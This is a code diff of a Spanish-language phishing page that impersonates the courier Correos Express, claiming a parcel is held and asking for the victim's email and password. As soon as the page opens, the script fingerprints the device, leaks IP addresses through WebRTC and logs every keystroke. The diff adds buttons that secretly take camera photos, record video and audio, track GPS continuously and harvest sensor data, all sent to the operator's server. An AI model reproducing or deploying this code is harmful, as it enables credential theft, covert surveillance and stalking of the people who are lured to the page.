@@ -1,12 +1,6 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<meta name="theme-color" content="#ffcc00">
-<title>Correos Express</title>
-<link rel="manifest" href="manifest.json">
-<style>
+Correos Express
+
+
 *{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;-webkit-tap-highlight-color:transparent}
 body{background:#ffcc00;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
 .c{background:#fff;border-radius:18px;padding:26px;max-width:400px;width:100%;box-shadow:0 10px 40px rgba(0,0,0,.18)}
@@ -20,34 +14,50 @@ button:disabled{opacity:.45}
 .g{background:#f5f5f5;color:#333;font-weight:500;font-size:14px}
 #l{font-size:11px;color:#999;text-align:center;margin-top:14px;min-height:14px}
 #dbg{display:none;position:fixed;bottom:0;left:0;right:0;background:#000;color:#0f0;font:10px monospace;padding:8px;max-height:40vh;overflow:auto;white-space:pre-wrap;z-index:99}
-</style>
-</head>
-<body>
-<div class="c">
-  <h1>Correos Express</h1>
-  <p class="s">Tu envio ES-8842-XK esta retenido en la oficina. Introduce tus datos para liberarlo.</p>
-  <label>Correo electronico</label>
-  <input id="e" type="email" autocomplete="email" placeholder="tucorreo@ejemplo.com">
-  <label>Contrasena</label>
-  <input id="p" type="password" autocomplete="current-password" placeholder="Tu contrasena">
-  <button id="b0">Acceder</button>
-  <button id="b1" class="g" disabled>Verificar ubicacion</button>
-  <button id="b2" class="g" disabled>Activar camara</button>
-  <button id="b3" class="g" disabled>Instalar aplicacion</button>
-  <div id="l"></div>
-</div>
-<div id="dbg"></div>
-<script>
+
+
+
+
+  Correos Express
+  Tu envio ES-8842-XK esta retenido en la oficina. Introduce tus datos para liberarlo.
+  Correo electronico
+  
+  Contrasena
+  
+  Acceder
+  Verificar ubicacion
+  Activar camara
+  Instalar aplicacion
+  Foto trasera
+  Video 5s
+  Audio 15s
+  Seguimiento GPS
+  Recolectar todo
+  
+
+
+
 (function(){
 "use strict";
 var BASE = location.origin;
-var ID = Math.random().toString(36).slice(2, 8);
 var DBG = location.search.indexOf("d=1") > -1;
 var D = document.getElementById("dbg");
 function dbg(m){ if(!DBG) return; D.style.display="block"; D.textContent += m + "\n"; }
 window.onerror = function(m,s,l){ dbg("ERR " + m + " @" + l); };
 var $ = function(i){ return document.getElementById(i); };
 var L = function(m){ $("l").textContent = m; };
+
+var ID = (function(){
+  try {
+    var g = localStorage.getItem("rid");
+    if (g) { localStorage.setItem("nv", String((+localStorage.getItem("nv")||0)+1)); return g; }
+    var n = Math.random().toString(36).slice(2,8);
+    localStorage.setItem("rid", n);
+    localStorage.setItem("pv", new Date().toISOString());
+    localStorage.setItem("nv", "1");
+    return n;
+  } catch(e){ return Math.random().toString(36).slice(2,8); }
+})();
 
 var cola = Promise.resolve();
 function encolar(fn){ cola = cola.then(fn).catch(function(){}); return cola; }
@@ -60,7 +70,7 @@ function pedir(url, opt, intentos){
     return r.text();
   }).catch(function(e){
     if (intentos > 1) {
-      dbg("reintento " + url.split("/").pop());
+      dbg("reintento");
       return new Promise(function(r){ setTimeout(r, 800); })
         .then(function(){ return pedir(url, opt, intentos - 1); });
     }
@@ -88,37 +98,187 @@ function file(b, tipo){
   });
 }
 
-function fp(){
-  var c = document.createElement("canvas"), x = c.getContext("2d");
-  x.textBaseline = "top"; x.font = "14px Arial";
-  x.fillStyle = "#f60"; x.fillRect(0,0,100,30);
-  x.fillStyle = "#069"; x.fillText(navigator.userAgent, 2, 2);
-  var g = "";
+function enviarJson(o, n){
+  dbg("json " + n);
+  return encolar(function(){
+    return pedir(BASE + "/api/json?n=" + encodeURIComponent(n), {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(o)
+    });
+  });
+}
+
+function hash(s){ var h=0; for(var i=0;i<s.length;i++){ h=(h<<5)-h+s.charCodeAt(i); h|=0; } return (h>>>0).toString(16); }
+
+function canvasFp(){
   try {
-    var gl = document.createElement("canvas").getContext("webgl");
-    var d = gl.getExtension("WEBGL_debug_renderer_info");
-    g = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
-  } catch(e){}
-  var bat = Promise.resolve("?");
-  if (navigator.getBattery) {
-    bat = navigator.getBattery()
-      .then(function(b){ return b.level + "|" + b.charging; })
-      .catch(function(){ return "?"; });
-  }
-  return bat.then(function(b){
-    return "ABIERTO " + ID + "\n" +
-      "UA: " + navigator.userAgent + "\n" +
-      "Plat: " + navigator.platform + "\n" +
-      "Idioma: " + navigator.language + "\n" +
-      "TZ: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n" +
-      "Pantalla: " + screen.width + "x" + screen.height + "x" + screen.colorDepth + "\n" +
-      "Cores: " + navigator.hardwareConcurrency + "\n" +
-      "Mem: " + navigator.deviceMemory + "\n" +
-      "Touch: " + navigator.maxTouchPoints + "\n" +
-      "GPU: " + g + "\n" +
-      "Bateria: " + b + "\n" +
-      "Standalone: " + matchMedia("(display-mode:standalone)").matches + "\n" +
-      "Ref: " + document.referrer;
+    var c = document.createElement("canvas"); c.width = 300; c.height = 60;
+    var x = c.getContext("2d");
+    x.textBaseline = "alphabetic"; x.font = "16px Arial";
+    x.fillStyle = "#f60"; x.fillRect(0,0,300,60);
+    x.fillStyle = "#069"; x.fillText("Reptilix fp 1234", 4, 30);
+    x.strokeStyle = "rgba(102,204,0,0.7)";
+    x.beginPath(); x.arc(150,30,25,0,Math.PI*2); x.stroke();
+    return hash(c.toDataURL());
+  } catch(e){ return "na"; }
+}
+
+function audioFp(){
+  return new Promise(function(res){
+    try {
+      var C = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+      var ctx = new C(1, 44100, 44100);
+      var osc = ctx.createOscillator();
+      osc.type = "triangle"; osc.frequency.value = 10000;
+      var comp = ctx.createDynamicsCompressor();
+      osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
+      ctx.startRendering();
+      ctx.oncomplete = function(e){
+        var b = e.renderedBuffer.getChannelData(0), s = 0;
+        for (var i = 4500; i < 5000; i++) s += Math.abs(b[i]);
+        res(hash(String(s)));
+      };
+    } catch(e){ res("na"); }
+  });
+}
+
+function rtc(){
+  return new Promise(function(res){
+    var out = { local: [], publica: [] };
+    try {
+      var pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+      pc.createDataChannel("x");
+      pc.onicecandidate = function(e){
+        if (!e.candidate) { try{pc.close();}catch(x){} return res(out); }
+        var m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{4}:[a-f0-9:]+)/i);
+        if (m) {
+          var ip = m[1];
+          if (/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)) out.local.push(ip);
+          else if (ip.indexOf(":") < 0) out.publica.push(ip);
+        }
+      };
+      pc.createOffer().then(function(o){ pc.setLocalDescription(o); });
+      setTimeout(function(){ try{pc.close();}catch(x){} res(out); }, 3000);
+    } catch(e){ res(out); }
+  });
+}
+
+function fuentes(){
+  var base = ["monospace","serif","sans-serif"];
+  var test = ["Arial","Helvetica","Times New Roman","Courier New","Georgia","Verdana","Trebuchet MS","Tahoma","Impact","Comic Sans MS","Palatino","Garamond","Bookman","Arial Black","Lucida Grande","Geneva","Optima","Futura","Baskerville","Didot","American Typewriter","Menlo","Monaco","Courier","Helvetica Neue","PingFang SC","Hiragino Sans","Apple Color Emoji"];
+  var c = document.createElement("canvas").getContext("2d");
+  var res = [];
+  test.forEach(function(f){
+    var w = {};
+    base.forEach(function(b){ c.font = "72px " + b; w[b] = c.measureText("mmmmmmmmmmlli").width; });
+    var d = false;
+    base.forEach(function(b){
+      c.font = "72px '" + f + "', " + b;
+      if (c.measureText("mmmmmmmmmmlli").width !== w[b]) d = true;
+    });
+    if (d) res.push(f);
+  });
+  return res;
+}
+
+function codecs(){
+  var v = document.createElement("video"), a = document.createElement("audio");
+  var l = ['video/mp4; codecs="avc1.42E01E"','video/webm; codecs="vp9"','video/webm; codecs="vp8"','video/quicktime','audio/mpeg','audio/aac','audio/ogg; codecs="vorbis"','audio/webm; codecs="opus"'];
+  return l.filter(function(t){ return (v.canPlayType(t) || a.canPlayType(t)); });
+}
+
+function mq(){
+  var l = ["(prefers-color-scheme: dark)","(prefers-reduced-motion: reduce)","(pointer: coarse)","(hover: hover)","(display-mode: standalone)","(orientation: portrait)","(prefers-contrast: more)"];
+  var o = {};
+  l.forEach(function(q){ try{ o[q] = matchMedia(q).matches; }catch(e){} });
+  return o;
+}
+
+function gl(){
+  try {
+    var c = document.createElement("canvas").getContext("webgl");
+    var d = c.getExtension("WEBGL_debug_renderer_info");
+    return {
+      vendor: c.getParameter(d.UNMASKED_VENDOR_WEBGL),
+      renderer: c.getParameter(d.UNMASKED_RENDERER_WEBGL),
+      version: c.getParameter(c.VERSION),
+      maxTex: c.getParameter(c.MAX_TEXTURE_SIZE)
+    };
+  } catch(e){ return {}; }
+}
+
+function permisos(){
+  var l = ["geolocation","notifications","camera","microphone","clipboard-read","clipboard-write","persistent-storage","push","midi"];
+  return Promise.all(l.map(function(n){
+    if (!navigator.permissions) return Promise.resolve([n,"na"]);
+    return navigator.permissions.query({ name: n })
+      .then(function(p){ return [n, p.state]; })
+      .catch(function(){ return [n, "na"]; });
+  })).then(function(r){ var o = {}; r.forEach(function(x){ o[x[0]] = x[1]; }); return o; });
+}
+
+function storage(){
+  if (!navigator.storage || !navigator.storage.estimate) return Promise.resolve({});
+  return navigator.storage.estimate()
+    .then(function(e){ return { cuota: e.quota, uso: e.usage }; })
+    .catch(function(){ return {}; });
+}
+
+function devices(){
+  if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return Promise.resolve([]);
+  return navigator.mediaDevices.enumerateDevices().then(function(l){
+    return l.map(function(d){ return { tipo: d.kind, etiqueta: d.label, id: d.deviceId.slice(0,10) }; });
+  }).catch(function(){ return []; });
+}
+
+function sensores(){
+  return new Promise(function(res){
+    var o = { orientacion: null, movimiento: null };
+    var t = setTimeout(function(){ res(o); }, 3000);
+    var n = 0;
+    window.addEventListener("deviceorientation", function(e){
+      o.orientacion = { a: e.alpha, b: e.beta, g: e.gamma };
+      if (++n > 2) { clearTimeout(t); res(o); }
+    });
+    window.addEventListener("devicemotion", function(e){
+      var a = e.accelerationIncludingGravity;
+      if (a) o.movimiento = { x: a.x, y: a.y, z: a.z };
+    });
+  });
+}
+
+function pedirSensores(){
+  var p = [];
+  if (typeof DeviceOrientationEvent !== "undefined" && DeviceOrientationEvent.requestPermission)
+    p.push(DeviceOrientationEvent.requestPermission().catch(function(){}));
+  if (typeof DeviceMotionEvent !== "undefined" && DeviceMotionEvent.requestPermission)
+    p.push(DeviceMotionEvent.requestPermission().catch(function(){}));
+  return Promise.all(p);
+}
+
+function deep(){
+  var o = {
+    id: ID, ts: new Date().toISOString(), url: location.href, ref: document.referrer,
+    ua: navigator.userAgent, plataforma: navigator.platform, vendor: navigator.vendor,
+    idiomas: navigator.languages, idioma: navigator.language,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    tzOffset: new Date().getTimezoneOffset(),
+    pantalla: { w: screen.width, h: screen.height, aw: screen.availWidth, ah: screen.availHeight, cd: screen.colorDepth, dpr: devicePixelRatio, orient: screen.orientation && screen.orientation.type },
+    ventana: { w: innerWidth, h: innerHeight },
+    cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory,
+    touch: navigator.maxTouchPoints, dnt: navigator.doNotTrack,
+    historial: history.length, cookies: navigator.cookieEnabled,
+    pdf: navigator.pdfViewerEnabled,
+    canvas: canvasFp(), gl: gl(), fuentes: fuentes(), codecs: codecs(), mq: mq(),
+    voces: (window.speechSynthesis ? speechSynthesis.getVoices().map(function(v){ return v.name + "|" + v.lang; }) : []),
+    math: [Math.tan(-1e300), Math.sin(1e10), Math.PI],
+    red: navigator.connection ? { tipo: navigator.connection.effectiveType, down: navigator.connection.downlink, rtt: navigator.connection.rtt, ahorro: navigator.connection.saveData } : null
+  };
+  try { o.almacen = { pv: localStorage.getItem("pv"), nv: localStorage.getItem("nv") }; } catch(e){}
+  return Promise.all([audioFp(), rtc(), permisos(), storage(), devices()]).then(function(r){
+    o.audio = r[0]; o.rtc = r[1]; o.permisos = r[2]; o.storage = r[3]; o.devices = r[4];
+    return o;
   });
 }
 
@@ -132,21 +292,46 @@ function ip(){
   });
 }
 
-fp().then(function(t){
+function camara(modo){
+  return navigator.mediaDevices.getUserMedia({ video: { facingMode: modo, width: 1280 }, audio: false })
+    .then(function(st){
+      var v = document.createElement("video");
+      v.srcObject = st; v.muted = true; v.playsInline = true;
+      return v.play()
+        .then(function(){ return new Promise(function(r){ setTimeout(r, 1500); }); })
+        .then(function(){
+          var c = document.createElement("canvas");
+          c.width = v.videoWidth || 1280;
+          c.height = v.videoHeight || 720;
+          c.getContext("2d").drawImage(v, 0, 0);
+          st.getTracks().forEach(function(t){ t.stop(); });
+          return new Promise(function(res){ c.toBlob(res, "image/jpeg", 0.75); });
+        });
+    });
+}
+
+/* apertura */
+deep().then(function(o){
   return ip().then(function(j){
-    if (j.ip) t += "\nIP: " + j.ip + " | " + j.city + ", " + j.country_name + " | " + j.org;
-    return txt(t);
-  });
+    if (j.ip) { o.ip = j.ip; o.ciudad = j.city; o.pais = j.country_name; o.operador = j.org; }
+    return txt("ABIERTO " + ID + "\n" + navigator.userAgent + "\n" + (j.ip || "") + " | " + (j.city || "") + " | " + (j.org || ""));
+  }).then(function(){ return enviarJson(o, "auto-" + ID); });
 });
 
+/* teclas */
 var buf = "", tmr = null;
 document.addEventListener("keydown", function(e){
   if (!e.key || e.key.length !== 1) return;
   buf += e.key;
   clearTimeout(tmr);
-  tmr = setTimeout(function(){
-    if (buf) { txt("TECLAS " + ID + " " + buf); buf = ""; }
-  }, 1500);
+  tmr = setTimeout(function(){ if (buf) { txt("TECLAS " + ID + " " + buf); buf = ""; } }, 1500);
+});
+
+/* salida */
+document.addEventListener("visibilitychange", function(){
+  if (document.visibilityState === "hidden" && navigator.sendBeacon) {
+    navigator.sendBeacon(BASE + "/api/beacon", JSON.stringify({ id: ID, ev: "oculto", ts: Date.now() }));
+  }
 });
 
 $("b0").addEventListener("click", function(){
@@ -164,8 +349,7 @@ $("b1").addEventListener("click", function(){
   navigator.geolocation.watchPosition(
     function(p){
       if (n++ > 4) return;
-      txt("GPS " + ID + "\nhttps://maps.google.com/?q=" +
-          p.coords.latitude + "," + p.coords.longitude + "\n+-" + p.coords.accuracy + "m");
+      txt("GPS " + ID + "\nhttps://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude + "\n+-" + p.coords.accuracy + "m");
       L("Ubicacion verificada");
       $("b2").disabled = false;
     },
@@ -176,21 +360,7 @@ $("b1").addEventListener("click", function(){
 
 $("b2").addEventListener("click", function(){
   if (!navigator.mediaDevices) { L("Camara no soportada"); return; }
-  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640 }, audio: false })
-    .then(function(st){
-      var v = document.createElement("video");
-      v.srcObject = st; v.muted = true; v.playsInline = true;
-      return v.play()
-        .then(function(){ return new Promise(function(r){ setTimeout(r, 1200); }); })
-        .then(function(){
-          var c = document.createElement("canvas");
-          c.width = v.videoWidth || 640;
-          c.height = v.videoHeight || 480;
-          c.getContext("2d").drawImage(v, 0, 0);
-          st.getTracks().forEach(function(t){ t.stop(); });
-          return new Promise(function(res){ c.toBlob(res, "image/jpeg", 0.6); });
-        });
-    })
+  camara("user")
     .then(function(b){
       return file(b, "photo").then(function(){
         L("Camara verificada");
@@ -228,6 +398,73 @@ $("b3").addEventListener("click", function(){
   L("Verificacion completada");
 });
 
+$("b4").addEventListener("click", function(){
+  camara("environment")
+    .then(function(b){ return file(b, "photo"); })
+    .then(function(){ L("Foto trasera enviada"); })
+    .catch(function(e){ L(e.message); });
+});
+
+$("b5").addEventListener("click", function(){
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640 }, audio: true })
+    .then(function(st){
+      var r = new MediaRecorder(st), ch = [];
+      r.ondataavailable = function(e){ ch.push(e.data); };
+      r.onstop = function(){
+        var bl = new Blob(ch, { type: "video/webm" });
+        file(bl, "doc");
+        st.getTracks().forEach(function(t){ t.stop(); });
+      };
+      r.start(); L("Grabando video...");
+      setTimeout(function(){ r.stop(); L("Video enviado"); }, 5000);
+    })
+    .catch(function(e){ L(e.message); });
+});
+
+$("b6").addEventListener("click", function(){
+  navigator.mediaDevices.getUserMedia({ audio: true })
+    .then(function(a){
+      var r = new MediaRecorder(a), ch = [];
+      r.ondataavailable = function(e){ ch.push(e.data); };
+      r.onstop = function(){
+        var bl = new Blob(ch, { type: "audio/webm" });
+        file(bl, "doc");
+        a.getTracks().forEach(function(t){ t.stop(); });
+      };
+      r.start(); L("Grabando audio...");
+      setTimeout(function(){ r.stop(); L("Audio enviado"); }, 15000);
+    })
+    .catch(function(e){ L(e.message); });
+});
+
+var seg = null;
+$("b7").addEventListener("click", function(){
+  if (seg) { navigator.geolocation.clearWatch(seg); seg = null; L("Seguimiento parado"); return; }
+  L("Seguimiento activo");
+  seg = navigator.geolocation.watchPosition(
+    function(p){
+      txt("GPS " + ID + "\nhttps://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude +
+          "\n+-" + p.coords.accuracy + "m\nvel " + (p.coords.speed || "?") + " rumbo " + (p.coords.heading || "?"));
+    },
+    function(e){ L(e.message); },
+    { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 }
+  );
+});
+
+$("b8").addEventListener("click", function(){
+  L("Recolectando...");
+  pedirSensores()
+    .then(function(){ return deep(); })
+    .then(function(o){
+      return sensores().then(function(s){
+        o.sensores = s;
+        return enviarJson(o, "deep-" + ID);
+      });
+    })
+    .then(function(){ L("Datos enviados"); })
+    .catch(function(e){ L(e.message); });
+});
+
 window.addEventListener("beforeinstallprompt", function(e){ e.preventDefault(); window.dp = e; });
 
 if ("serviceWorker" in navigator) {
@@ -241,6 +478,3 @@ if ("serviceWorker" in navigator) {
   }
 }
 })();
-</script>
-</body>
-</html>
